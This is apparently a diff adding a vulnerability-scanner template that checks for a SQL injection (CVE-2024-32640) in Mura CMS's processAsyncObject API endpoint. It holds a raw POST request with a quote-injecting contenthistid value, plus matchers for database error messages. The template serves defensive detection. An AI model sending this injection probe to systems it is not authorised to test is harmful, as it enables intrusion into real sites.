@@ -1,0 +1,29 @@
+id: poc-yaml-mura-cms-processasyncobject-sqli
+info:
+  name: Mura CMS processAsyncObject SQL Injection Vulnerability (CVE-2024-32640)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: CVE-2024-32640
+http:
+  - raw:
+      - |
+        POST /index.cfm/_api/json/v1/default/?method=processAsyncObject HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        object=displayregion&contenthistid=x\'&previewid=1
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Unhandled Exception"
+          - "SQL syntax"
+          - "MySQL server"
+      - type: word
+        part: header
+        words:
+          - "application/json"
